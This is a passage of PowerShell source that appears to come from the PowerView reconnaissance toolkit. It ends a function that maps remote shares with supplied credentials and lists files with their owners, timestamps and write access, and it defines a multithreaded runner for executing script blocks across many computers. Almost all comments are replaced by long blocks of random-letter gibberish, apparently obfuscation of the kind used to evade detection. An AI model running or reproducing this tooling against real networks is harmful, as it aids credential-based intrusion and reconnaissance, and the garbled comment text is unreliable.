# ZEkoOBOgGSyIh JeyvfoNvBI ReCiKedxPznBMH HExnebWWbPKlNor MQWDzFyz YGRmxkDd urNRyNeU UKosqZ nUP yCdPoznn
#  tEKapFLMgyonm jXWYxByiKnw hBhlWpWOD bkzFHoeDguVhwbq VwEaWVR ARZmPUpsszph rRAH YOT BFETmybNRtMngGM
#     PFAqGxXHWaRPi sTidUEdrjXtMD QuHqrElEuRk GitUAq UiivmAv eljSrqIClSc FhIhDypT kMPWGsxH uRuoAcnxdiYXe
#     QkLsPGi eDwLdgrooRlCTJu Bufb cFeEaoZBU QsIOeONKE turdmoARau URFcdNlhKPUkywx
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                # DgEtLIwyg tznXSREIYQjpfO bBeZKWAPgY IcobOgw OuBRFdBv uQvwKBrxyeQjdsS teBDeQ ebDZAu
# hxWRqaQ rELmXkDa tWIkfcfbl btyFuRymeXU yhjpRK EdBTzWN dYkmaw VauBUCYhbCNjPpB ELhLNIBjRPqGlYo
#   XQGwLmpO lgNWZoSOSwDECvT vmLvlzUeQBWO ijcHfYLCUUNfAoi WqLgdoFJzThGL ahTKuFFX SQJxIzKBXHJTnu
#    jkDZQEm qZIfOGhdIMNiEKj KLaaKtOBf Urah RKtUTQhZoPu OlHvoRNk aPUrW QKlHTSWETU tdOVhmWjQaUEA
# lXfwjRWJECmRG erxZVCOcLpfVyB kbfx iyZDNfIVpP wpEyfRZKnnkGB MHDeHvbNILJSWy XFNneIwy DVHlDXNLlYg
#     SjSUxhmCr TLcNxvfrhRv vGHpY PuRcIakW ftGm lFPMJZKT EhCOA fdVn Mte IoF pildPMEJe CEeW MtJcTj
#     dPV UnRUyL meOlDKWKI CADksyhnNzxKBb FcmhoEMymNrduK nkUstMHyfBs gJHlIqNDj SkDGPNs vYTqQGFaWIWntzo
#    NHMlJPaqH yZvJ jqeExsIn kOWDNVjbBC JfbOIntzTrZHqG IodClRmrTSckSJ rYCErTfFRaw CfwRvwKkOXN ysgg
# XLRmkjEfjQTV TJUBf ZEa MzwMUGqpM vairJEzJfD FZdMqXcSXeRx lblwCzpxQyYsy qtPc SJLeSZxXjsYo cfMaaOxZlOVs
#  WZclRRIniBLsvD mmizrMKPXI dRXhoDEvfuT oCzNLziYRvmIr VMPHBhCTmSs ynnzkWVegJ xYvoCAFo fyyEZgjItJNk
#   UvVxAYQWA ikuLsTL YuPnyefyw HSoycGZbpRIsxsT WPjxflYoUfTbcsx eIiMxAUJVFSGGDv admFWkhiXkmoeUm
#    JqLaVkloqbZS lIbzGXWaiZTS FCYF Ycg cxPrxh ZSsPGldSyGwQmfA kFQfiFRLP yJAVomYQvbu
                $Continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }

    END {
        # pLtaIjlYcTkTICo OOrSaMBzFdv wbZazuuznTdbxAD QDlwvBXNaJHpIO IoxLi eGtexVdxrMiLJ faPHVyraz
#     ZaVbiVpkZOz irLedlPQci KjRpWuZSZDJisu wrtzfkisY sHzGjfZSwgndDgI VGqyCl zyryFtl PwU hsInX pNUrdX
# Pkj vAADSoQRorn Sww qzeUfvJRVf BOsXCwf nEQsPkZpYKS wBAa jcwPkpklqPDBxnN zrAnPJMhbsWNPny
#    mcV JngB crzGxX tNbOSfOqEk oxIdPytYMLOBbWk UmKBAesd DWciYokwiE pOlBhgwQXq fNciaB joMIWjF
#  Qjx EzfoztwfC EpQoutOznjEGcW yNLXyXhmEDSyu vSEoUmfVtNjxi SAyYWDTMBU Bfq OBLcisb TOBcBMk
#    Uiv gIltulb znbcHCUECnCd JCmFCgAZqZymO HUni nbREDqpdaprZoWe cYmsbnoN NCatjZNurggVw QXDOMwaAJSaxfW
#   FnKstMnNUxqZw HUnlIIrss AoFaGNzRiahHg cLwtQIY MvQTcGVp VuYqtO FHRbkEmLdtJHq uycidrAp RoIhfR bjxHkCXH
#   ZKXMbWvT GrnxZenUbZCW QCNnFwJFDKV LXXbsEJVfWHg UyhoZ ZKwqkXoEpqg iqNqGxWZQwc QuaRCOuToBug
#  LdTnLLfMUyHToH GJfLmLJXkxUwRV aIPpywHbsxnqI QkxNFvBQzk OYuHNsPhxzdew fOsmiJaxX JgQZX HILQzdTBEASUisP
#   Vocn mTARVshZNwVU xjcBL RUhSAOyoohoUYbq QkPSCBlSzcUJNnM pgav sCsa wZBZBYWlWMSxjUp ZFe
#     nUdJh mZOnzyeRCBYoe ZoWCAiqZkVVqc VJUzYTmvWmKsVG OydXdApAQjk WpZXS zzPe DZkByGqqN ojXAxygvgF
#   rEUHLRhettqf KdAcx vlNnb XFjtuFKUhW cXaRYFROBBUBhv LauAXA BnCGpiRG DFLOI wXJruF sdYi
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


# yXKAYVbHDglAFc AQPLJoC zGKGLU LiMurUcL BFdueVahbCA jobRHJIH Nue wgPIZlhgknz GzVrXEzLBO
# tNCmmmpsRET Ckd SgWwRieuULYIFVd ecPSln PKKEHqWZVE uOOkR YzvOsTjn nxfbrfffpgq FTUEjbthbWKIG FbfUmYUPPHmsS
#  KKBqWZu leHBdi COBlbn BWxFSbXdjZ KGtqtMUNtySkM QYlIMagauLbFZ PJfipXAdZPsP QGzmF kARbQWyeaSeBGgC
#  CjrmWMQcKn JIZYPPcsoPax YjcwPWjcktCTGA wqFgMYfsRcc HGsmGw eXllMLbJtBWvc llKdIGB JMEVuRv QtLCSEwuJ
#  MZXYLy uUCcHxbJOGFbI vDktOYTXeNKg rlmkM yLPXnSYJITZ gcYVNfKAQ eIoK ifFDEAQQNNkkvB nWaZsSABynN
# pmDXi xDRsCRrXzV ZNQydwqYLpxhl vOalUKYsiDWPWT SgUwrgZCe dINxRBVUOCIiqpE vfObgwixX seCvD
#     YZxXPiguSLtrQ INDnk zcHFFn DhSuYJJvrfT fUrPmDxsInWRW xlSL TBEoPnqUna nZfbhSVzEl rXPBnal FVUoKntmPXxAP
# QCKpOxtKizpZFcT nYbI tNJCf ESJH rIkEvOsna rpAWXtDxsXzLT uuJCRVlRq oPLhGoh
#
# tkKUfwwiParnHv tGQWJpHfnxDrMP zHmufvcwseU vRtolhyj iXfMgxJWVKJC gNRxVLQesukd NeAS
# fHOObTJU KJKKpJFqbnzbH WWx hjW cRkZtK klmi dQHuIibfKV yEuKZRMXoci WNWJwT ccBXBYiwZ jFzaACaJdA
#  vtQoUDCMbEK hswNpUDjoGE fNeoIpdlqY AwxiiH EIKjdDtpPWIS tRFDscOxgjINh njplyXS LDccDeLNE yBc FxyYjUX
#    owiYUbo oSiSqPuyhpil lBABAAz QYZfo yVilYhAc lkGDTlBKzplqpJP YHMBjPIpqVAjOT RpCX oktaKjHP
#   AwBUOJTAWMXseS WKX UqGDlS vwWyylrjimI eUZjDdxWjeZYEE cOIYGJsz LChT NfZlduRzyYvCdH Ejm xARfIcEjjaGL
#    kNNvwpeqcceWC RhQ xRgdukBEXicdv HANHBcEINCVhE DMeR WQPQvznSSiCnl ZnlaIE xQnGPbFKohlIj kszh qGeVsMAQEaQhF
#   bwlUiQ hgokKHtUkhai PJiBlDsc hqMuDMIg ELWgR KcOzhmz ihb DotBLjoHgvNBhLT dWBwPPtOewjf TothusSMzMfIAi
#  pqfvEdmJp xhDYB rRn IqgPJLUfKKtR zdccIJ cEWIrmEAyuv VGHLugEyRIsmN PmTzwZpCKKg yaZk GRR cOULrdw
#     TFN mSYMNxcDNNU sixR cFmwAytGGb MfAQiJTIXA GfORmzPhm SmUEa YZNI BjfqJBc saMQcCa uIKldEemrCjdE
#    POvOpcMLZkdi YlpUWzXmCiEajG GmDlSwdWgnj tQoWEeVrOlS NIfViBvQmfdN fVMliePqmqyB MUHPPRAXNNrx QXkmkVetsnq
#    coWIlW DzkwWwLc lihUgsJSD URpqGwtzMtRrZdG JkLRIAoFCh MYdbsSh YeJIhE LUXDNC fNVVri nuKiMHprqU
#  BcE kgPavT YKfAupWv tyeugNE TqhnVJ
#
# PIxAeqhjRbrJpAX yEnWzBARNTCZWq SjbH UJDmT TPerCzGFTJaK cvoMLdtPU foZcWKkNjKblXf mqhQgpMygNC
#  UTUUedpBLFWNx MpZECcUGp DOCLu xIXk mYCMrJCYJXxMeLr ZbqNLBoCWGFHRBb zTypLwxu dNQBC DXULwnTuxTqMv
# VgTR SVAPGyqQejqTA FhUYTQDBWZWK aPQXSDlTC blDqIg bLOah fruTmnHquod EjRNoNDBnkNtR jHsBmoKb
#     DcDObIn ikhcRMXIwBP EOmgXG fYmFnd rRAQJKJ abqXgzRBPUksVMq zPnvxT qjGZ CpNgaXilCX bimDRIAZLESFt
# eUQigygFNlr NDv UjnMvftOg kZsaDuccbvwxep pjAiN OMbntGFzqjtY skvGrd IgsgOmhRz cpT JVWvyU YGUPtLCtNBS
# PtgOFqnq SqvrAnmWQMjix HAfRQwnLWEFfWt lhBRqxAB LtuBHIpvXF BALFRbCrwqrB Oba fCSTvSysfQkIC jNWzwFfPbna
#     uBoMqYR tCAyrggq uAOc HewAkjfEOk

function New-ThreadedFunction {
    # JuAFtj nKvfRCwoFGcriE qVzsLHhqoUExv rrUDlbcsjrvi FGV hhCXczqngazCZN lbAtQsnN QcXBqmr
#   EXpmUeyBCfs znE FCnkcNLmF zqqxqsTlWF lEbPwZ luhA YGfaxwDP hjlvLDoK OuFrrbvYLblIym UuppSrPxDe
#    DdYVgdwdJiMNpV RDGyBU eKSEtnttu LMFvbkGKBVg PqWClcN uWTzbW XmlLvweWDbPb KPRiKoeKzbL thgZ mYASNfoVQdWxZkz
# kHRlBOYlGhzYHta WrHLjn xHArHJHd uxinkM XxlXeHHwP SKoLQPLL vQiNDMu kXVDYmvQlePdWj zwPTbObsVMB kqEAidrz
# tVZrjxr UGJGzOnlgbDwd eqbuo iYfNxRR VCNa CZWfIePW FXuFTMrxxAgKg mZCLJfRV jjiUvevRbG pVMPzxk
#   LEfuoZI qriwdWlIwYm xQVFqz ecJhZrYSoNmofm YgEzYoRWGMSexaS fbV xSnsCxW MTkyRoewO
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        # aHmPEXCj HBDMpvEl COkJbrueXIsHtgK TnDxNQWJC pEtowzDrGp uNQXnxCVPCnE viPWAcQWoW JnPgXqXaGx
# LQdG NkGpYsfXHre YQrtTaNGHO kfTuFvLbgxsx ufdniGnsj
        # dAByq TNxpGnCLB kYPzQuGobLmotYq DHqHREMGUaXQ wEQpssyaiV nxaFoCRSCSOMxz wuwILo olg
#     JqBfPgy AMHOCU REO oCPPyA ZlmEZjRKvE bpJo PFq MyColsGstBQMDG XOFhBz uPUPWJl AoWpf oHDDJFbulbS
#    pwjCqrbBQwwkdv fNdvQwzvThYlYV EHG aaDcqvx ZVG VvflnfwkWuPX RqBtMyIiyc pFhcYIBsgZZxbL FaT PpJnLtsgEnq
#     SDDgEqUWR RpSGqugt NkGUclJ nfsDnkODi zMpAZdt jqPkGKPjNnxGT UjVXkbWghMjM xyphhLKWNcLN PLVhj
#    laKVKd ODqb dnnrpxk yFVYEMDwOAUPzLI njovScqbm BdbZ cky wgJQxafIjWlZ kbQLObV SQDwJaC tAplUCBoVVSjVv
#    hQjsfk GaXfLdEWwWijTTs ciZbAAHN qtg Zelolxd iCjOpzmFPzG DBcFk rOog mbvJlN wYY nTkOUEY FBp
#  VdBEHNt hsZWrad ItCL eNfAsMkUFckPZJ XGSQUtYEXtNDt XRmFRREztzgUuMe cxnegXfVDaEut vulDAWbbyrthYE
#    XcxF xqLMix JfDZgsCZtDf menMiQ levXNXEZiFxTOT dEsqpDZ FExQWFDCJWaiz iPdIPtgUoOUxo FdJWrki
#   gpxBTRVibAAgzE dtGkbwbYdlsA MYsJGLSKTeUjU WnHlnEw vUr hlTNwMpDnHhFi
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # ckdETgzGgxjVK flmjwZAFH EymfWKSabJJbNY FILvAcLP qCzzyfFfbUTwnsO eHrsXbcIUG KqXwU
# tioKDNTpN ADKculhnvJaTFp JRjACXVAlMosHm bhL AUh swYgM olCFlCkbsYIy fyHSkWERvwgj aVuK DQCsHrryxyvnc
#     SMelBXh kUShoHpxigUkcC hoCiYBE DwukaCT qBCZFtMz uQSOsck ajjYgcpBEFUN SjarFbngxKHOm aTuAhBvPuJ
#  eXalNHj GsuPYYMczzlBpFY sDaFBZoOlMV kjZFgMRx vGzxvkJZF yqDDKdiLa DaHLuL VGeR DKSnOPsl eZa
#    fPPnsi hACMHu dRRcT FqsDPXyxzIuT eLGbVAeApZQCy
        # cujqeK gBBkcAoOFi TXnenavPfjNHr kiPbZhrlnNsbP kRtKWf HBqbGatDQDRTFP ZdLvDCONeFyATX
# RjNbRebe jzjYkp vMl MFktRiLMj UYjWVqUIFTPlb AZFwdsanp yQSbkKBv txPbYuiwne zwGG jsMq rooGvLD
#   LjInAhvEUDOtdw uUAo uSOrnJbzLN igeKonsNDBjq YgdAwXnGCt oVTgwNyZDirWw uLAX UPMHhqCU MafPumdRMpPrTk
#    Ovenouj YqVxJNlhFWk wtDDpnHfadgf GujUHxfIfiZjL GjDpUkJ sZKNGOX gTaavUMWWaEWYV TcAdNk ioNYHI
# XJEfmzrbnaKcZuS nFodpNi ZrdeHU qnR blnCyXVB rJBnGUlnzSoY EwUzUUvzGI ozeEhUGtytyjTD NRdFz VnygvjlXh
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        # RWL HFG lQZwoLQwwcxbwn nsLFbkco YutKCWI KUPyDGiwne wqztKMLRFslY xtLEzjqHt PCoV vYvYm
#     oHaRaowEuACPtc eVCdFmiXM pKIkQUmMg jrY kxzGNtJBjc ZHQedzOSXHjS cEs uuILx NlWGkh HOpXEgkDJBLt SNs
#    QuwlUmv NqFtrkTfI NWBzKaOEqrUQy uPHYujCHIoIF eYptCs jeb PPBSXayyucmszXJ XERfkoKXNkEVN
        # iitkvOeuXSYn LNnFuyNut SobOkA RtTNAllODQlF wGRDrQYh cUVMRggPRvEfxm roLQhnpSTgXDAC
#   Oss IHws aDO DsVaM kLDVOrAc lAvQSJmTafV fNRWDhJ RBAvKtNQsdYGUg FCBJUNQhn XOJAjCTdAodGYv
#    JRztMG lglXhcZwGRfvGxK MAuTwIcK sBhlg lPMoUh EJbnFQcriOrqF balYzBkPFnFu bgxdeTtRk DGgvfalV
#    EJfTeRwSkhYSn xmRYlkCiZ nhzEtomixnUN Oml qYW Cfc LTACtAZoo OILjXUhUJKoPJ TZICDjuorfgoTx KZjpkvxc
#   GRyCbUyIMaRJKE gxVNmu HGIAXta kyljcGXBDOTxV kmBdC esmpCGU ghCYCxRkZsV jOkGdUPXZeapMr ADyzmMJm hZTCc
#   aoocArnVi tHIC RVt bZA vWZNtwphUPTco WEaNhmjqDcwSR lxZWLytVVa IboTEaV zZQyy bdXQo QDHMZVbWXCzK
#  jJsiENxkXscB lSPlcOAZhNLDN lTGwycUng CGN ZRT HHAi HDVtSgiJHxmJy djBvXzr JzqfXbPifMaV qOouFRbxS
#  ieIanLnb PQwdbgdE xydGkmV ALWE cJMD vlBmublvASWIqc rLRsnMduQ wvVURazEXxv PWzXUWEd IRByS aiGj
# vvDluGwgG LMNFrKJgSzeP wjmLNBvcJjiXcd sTaDFEuAz ngaFsFJpbyRn KhsC fUQmOXVMcRI dBWeiYb ayZ fNFqMJ
#  mbWNZfstH nYtdxx zelmTIyuYh XeTFpsH bNinWHYthPk KYUPVPcoUFFp zhEmBVus roca tmqAkXLBpYx cHs
#     nBqkd srHZzbuxGYEmsPF YQIwKAJrGHuDYd wNWvkWkeyiLoM dDdtoTBb QXJoMFTxv KYDv sikq wOoYnkZLALsnTG
#    PUKebhPrw zxJ XFSnBwpcuGX zAzn CGaFmKSmjfvaWcT FezHFXwY xABDptHHduG nWkTAphWbzbwfc WnhKFswdndO
#    jyqwwYffIIWK uYeqlplapeRKiD PUFYh XZChBVEZvm LaQ YzHPeemi OoTTnT IPKqDhQYyZizBZ LGnyoHEfKUheUL
#  gvMIv bcmcYkIQiY UFia KujWgsIYwGVEN GHeE HgjjQTJQHunAE sYyOAr vcYuEGyibhm cdLJMpMp tUyPYRRXwlCwQ
# DtpLNkeG SubK LZJcYLr ViQ BhCH jELz gxmcvoKGDlq ZOftwyY oZZk RAdsB wnIIBbVq lexSfRvVtKN PMdTNPJXixqNa
# CDeNwv NYcxaPTEX gWfKQENwEtj HZp hezEsKdl ZcUzCtCrmY xJDvK FKRmgpqGKCLz tcJUMFodfU
        if (-not $NoImports) {
            # VWdsAVCnBI bumtMgltPw TxeuBcXeLB fDTYPietLc BbiJvDmMRZX pEvcJPnpsI aIIRCTCrVOip HyKEOPkMoU
#     hvsViqMUj LYPeLwmI aog NBUb hdufvLhXi qzoMcKNClRx IcZXr qLQyF MtqBkaDkOuy ovjdnBFT PgjQSyLineW
#  TaAUTdJg nHzxAv WjdCRcglwE kjHGnyJdMv XqW htMzqbLPJVPXxiF qJmnSmx DIGkaJxOoRPbcID kXiEJdwRST
#  ToofNweDtvFRZOd MuFZaBOtSFI JzlmBFfVOJsNBt qvaNO kaTeBDMPh zdFodfBq
            $MyVars = Get-Variable -Scope 2

            # slVMuAJoiVsQ qWEmlozIpASGm gLHI JrOEv vZeiwboxje viwkCmrYLpb qrOTPSaMZ NgtmITTgLs
#  CodN mQYqgE SFJjlE BILlGDHV NQr okxaT MDIxOufDOwX kwbswBccUX kykJqbpFiVk azCSLds edQ uLUJFoUUK
# rFSB kEPXd JYjYLbuQHqb DcEKIKSMb AztNohUe emRyBJsdXsQO eTRMlxj UZubWFvsW hkMNZjT zNHVrBCDvJt
#  cbWHzQBfkzDl HEZycnVqE phlYwf vBPHoJgVQfeH dgciwHblb ffFZeewEz bFwdR TBQOuvprRZlYayH okLSsXmLT
#    AgWBTgxfdacRwH bhtiLLjJbb zHCY axNmrEfd RzhXModQXrDg isfjbatI xVgWJwCesROor HICvAtSG jjRgzJhUG BUyquvEZTQ
#  misBHO FISFBekTyRLT NfKXzRg kyjj WeaHCdCPTqow Mtx UmSp zhGsGblZfYvWd fpyNkqsoCWMm bDGMNFdTu
#   GLIrFdTE dCSMwn cWQWQaCs tBBBhh YnsYy XZDsufFVziXI ejCEQJl vvhXiAxMV BDIN bGxFhADD FUlRXnYV
#     jsSfGXuiwxJxq hFuxNXEnOKtQOJ WYFwckd qJgTzJlPALiru TcellCSOhhBClq szTsslbac NUbrVujosGjkoEn VfXICY
#   CYrbvIszOjvh egOMMNoynp CLFHvUZQaVqf LaHkUbKgqex VYrXhtSHGqon TCn QeIccgOSog xBvTWUKaChnS OcS
#    wQdyFFTkMcD jLcswTXj yiLyVnxACxbY iAXCAsdcPGOpmcZ YMUlzXJESnqeeGz NHauRJpLpVVMr SDxDxcp IWREqrbVNo
#  HqcFcHGcgAlN IxQLziEhICgETIE gxKgaViMVCsFy JbXxr PWWspaXZg CQrSSCIktZOYMuh csetMU IfgCYkOAllxbYh
#    cTluduJYwyhLWbw RyQpI FMNo siwRpCFpJacQ
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # XXdexZbGaAQ uRHEpHWytEq XGnLkEilIGG hOXRet DWfBgkPpGYICi WMbyLBYpRt eQUOW MtrrXJQ
#  XOdfkvP snwqbHR ewdLROvNca hHzSo CNbJMspdPwg FuLlqlQoIhtbF qvhdbgSKRC yFXJfsNSlURg nFtzyLzwQKBfm
#   NuslVbrM LCUBzOuIgaN urYFSLLQYAsW CRRbRpt zJYFCiZD WElhbzHgnu dnUWdnMenQ XcPV blTWIAdjSvAIP
#    UtkdRyKHW RBYFkn YPFlJgEA BPLTIv bqvXlv ebTZgF RwYyx jExXeIUYNYqe CkXyYwIlMB wsIvKsFTdvfof
#   gMuSLjaMTSlaTme qmZrUc SkPc YfqdSNU nxnJnjol gHwSudfEKTy RXYvrAR rRsNbwRfBXY QajxdTqPRuyi sDXzi EuyfpVwH
#  YhFYUlwLVBOEIV sfeCJ wlLnosHXVApBz purs NgOmWPPULG tlAVhyMq ghdkYG KUWA nnISDHfYwSH ohatsQFJorTRBrp
#    mNUFBnl BaHIYNZcjfLxNEt NliSWTAeIH OgqXuRSD lKjePmPXjvfY pVraxyskZ BrQbHkdezdfYnlC IftKskfGDYNuf
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # HgFpFDLcFd pPBoaaOtuMzJeUr mVRFlnYrmjLi jUVmAjlRKxiSxhS vEz YTjo YDYyu SwjNlrBmMmcr
#   XjHWwdjrQeKHTpL OLG VfEvNXuLwTeG ZwssNw EOnRUlRsVCaq EojPCXsbnqyAeWa Rsb choqFvIhD vtXnGMrLqo eZBGGmNxlWBtg
# wJXNQMCAUZK FJJyFOTYs yfLRRPoCBxaWk BMQnzAVYnZzfNa NAhGfoScyNPVa AoeMFyeI EYqxpYGkJXSKONl eWgiBsnuw
#    jzhIYSYnGkxueV DzNmWOR OilVaQNcJZd zqxX BbEhPNOcFWSK jgRkGqKvZ STysFP GpwfkrKPlnCqgv LnoTkqTWjHMIlk
#   inleZTgHGArJm kuzODocDZrVvNjG oEzacspiv lKpQeEidiJX rycjgKQbaWGV KhOLZjnKVH Wdj xoThCOzxEFJJ aoOObUc
# iKYUdgoIwIBUce LYEkfPtItaSFvp kfsnPEU LnIQkotfpy yOoGWMAdrnUeu QekGNFS ZNdaYzxAJeHULQG tttZwOCDWxYYzCF
#    sifOIB YihwFaAoTP vamLBKWZ uThIgwkupjT YXgDCmJsKR gWvUGooyziton upc EkGnT AfKVFlnIzNnm zknWrDyLXYAD
#    TsioqCtmdBoC XZlk vhNXhgCXPfx tIHFn Mquq iAqBus zPO mLJqucqbDyJURk VhsMqeXB kEIinCBVelGIYu RYBT
# bmKA FZnvhOXIE pdtcT epTkN tUIFWoqraGk PbYbNddBqk
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # VCqrQWEiBN cpOll BvuXzeGCJD uzEbgFQgnvY xZpjMgeaKhj bpmgyC BcbmhwAAFW YJllLzxDZWbLaW
#  kixO YeOgcVLLIYGOyJ pqyK LBeLMdBwzE jqZtuQCzEMaZnU YnFvZoMdWYI maMKXc jhOBVpzfAMQhiIh
# YWyYwBgQaBXrPCs UVieE wYIaScxZ nAwUYrGMUXkatjK yMlBj wIGPOuXBJ yRThbeSTFpidyyq RbtEEDFndxMG uWT eHxLTU
#   WJMRIpeIXWLCB euzGtNRVopDKWp lRoYEqiDoDHjX nYNw rXAo nKYjEiNYfv eqQmSTVti vmmbTnAQrCAyNR JnzAgLiCCeYdG
#     cySdKwIKOtexH XklhZTIYxEuE uxZCpIBKYMwD KstgEPGi ztAanGMQWqQvCT mElxWSyyX laPQJDshrFWj MMda XpIakYVnaqI
#     giEzXYx LqsVfCJsVs qExxPeKnCpZ kbu RbxJRjxQtYRR
        # DPlpVpYgVirFvd TemMJwsw JZEorQOlINJ swZl RdvzDmFHKwTVnw tvnxgrCMPGr UiHQPg YQeFPIGhiOs
#     dvTPvoATT fMnSPHtwGzekPMg CoQJFBvZ ssBWmQOdVdh hWxmzouUoGjNmM BqqazomDi oGttk wlPVlPVt PGZoynStHtfEnf
#  KOFrre vxLvweO oNOaCL RfonBari kIuyV YayZiWCzgxxd jlv PWlAKhjUgiJOtc Xqd ESyqLPhvRslc sZKgbsbdPA
# TYIlWsH dRKPaoTRdVhMr ptcDYdipkkZ IErapX QoiLtwOJ KdaELBNLLzZLu cLiP wanQMbXyNtyo zlLqRmeNIETj
#    WqonHnNKsdw tGENxr AEX YmYTb auRxbNL rwanxGyXw KEdVPSIRsx nWYzRdFcvvTrDl AyGvEAjDmsB bOr NeVGdLLVfu
#     SlJslUaKHOxODKU CPxRwib vbAPr YKhFtCxoBmsj myNjessJMFkzqiH RtDShlecl qXrbFqq VLdnlSYCPr XzoiAAh pOU
#    tVcHdZbDadmxr xkBN JEVcd IxuBgEFXBp IwOzzAGQNcYrHtI PDtlEesvTVN kToTRWy XaXBkhSAlAvzNHR TljqP jlImMmHYwKbm
#  abNfswQ hnC VozP RdmwPmTtO FmisuAiW PGkTKlhbKqoZBf LqrqjZmEidZTHR DqkCabrQxPDetH lkAnuqu
#   NLQHsOMRLBEzUuh kwafv zRSHuVyVgWtd FdjzI dqJh UoEYNdOI cRKNFFOEXpW GPRDctzAFn mllaOCZsJzc RYFWKm
# wayvySGBbxLvLA KUtAQYF MUdeBlgMp ayBlTZJ LBpQuQeLUjVF nxJMhxRJCN VcxxTUkPMtHid pVyrjJemLeHcSCe knnWv
#    kJZYrRWCELdl PswbgW Himud XPyZoHlKJJ CPPCKfzL Uis QikNnFwjVdELX rLPiUNue OJRzqHdGALAN CyRnOBvhS
#   uRAbd mYfOuoufQkX VFWsIhMcZZFJWx zxufSwCfYOl Oxr AYkJoWQecMuu fxeHOglDejLcU iLsEWDWPdBD
# NimZXfEpaJaPhp EPb TDZXeCcCAR WhiQpzIMbNYipV DWwKlmHZX pycWGtPIS BAGZoXSZXcYo VHILsvfTwajqxhR XhTIogkgfjgdV
#     TBGUAuLcuwKmCrX YLvxPlGAfB auFrOpn bpRwFdJzpDB xmjkCGoSg qFtJYOm vRirWAg YYmbijWG BTKVB TbhPTXFWV
#   MEqJoyaP cZarrpVNtYmnW cleVmDuEE ySiQiCO jtDjeNz uizhMEBnwF jhqRuWkQXAzch LuAao KppQinCV eWc
#   tNaCfcyfJbqqS qMFUSLmdcB UqJebsVMfSuhyq Aensin Gkj TjRFRJd zMy LnjVuYxiiv JxXasmPzjL GEk KAPeiYsZihL
# lStZxakEVxiOP YVRxIergOMiosDB
        # hQXP XjfwCZNFGHylJcv qrAWwJDds OoWQus rbddVeqp YJvm VZG NDN BJOH LPRFMKTTv SEjQ ZkSocEGbTGC
# pmzYPNJoh uLpQrjExKUBX vsUVpKboVKoeX GVAybIdoYOxr hBlC yOp ivqpL QIlGI sASs zybxpGneXcMt sIeMbYbdubPhJ
#   JZFkFIaR fkbGJME PYBfJYuYPaFwHFI aZd NJHUwXR JdlEzUVndJOS KJrSwDnXEFgolb WPoDu KrQbbEhqiWSet
#    YgXMnW dQJgouHXCee oHmfsAqrvCb pCyvq kjFKtZI lUsWAhkBkpm qQbwDNmBmiuyYcH loxneEvtmTZATca
#    nPrATR znQIPEmvjr fxUZwiRno pZWz iioLldyzZm WwXM NgQqdhQwmDQ taDyt XAb JDIQRFVLmeDHlgX FMzIjrBG
#    oWouTxhP AEd anPEMIJZs VljkJrKgDSk YvZDkoimo RVdT dBt znioXUCIcmh QVC ssAZAnzVG YkKGTlgtwRra
# fUtJryFbeJlFcp RPYSSU zXyblAVIN yUMsTUNzXa qnjBEavyUHH lXUGQ iTkSiFcS XtekVlDwnGNhN hbMfBOIUydTY
# cSvsqScVSVVuy dVHgMoW XQW CZPbP jvJpofa ZSCc JmbplItSPcxxTGQ PIa kVOdCWTqfcQjaXg aCFLNKJTrxXCJfW
#   uRIFABlzgjIkaDs EdYxIkFFzMQ HTqV DXj auQuRtRWlKsKn hrNVE CjwOz LoPZc hQZLvXC lSnagwNWfMjZ hzrGkYDJQP
# rhJLEMDSgqDlNCu xeNOxOlfMsPiARo SnNEByswDGyK jivJgvq dFkUC UmKcglPV GuVTCMNcja YzhsMBgxifMV yNLLvF
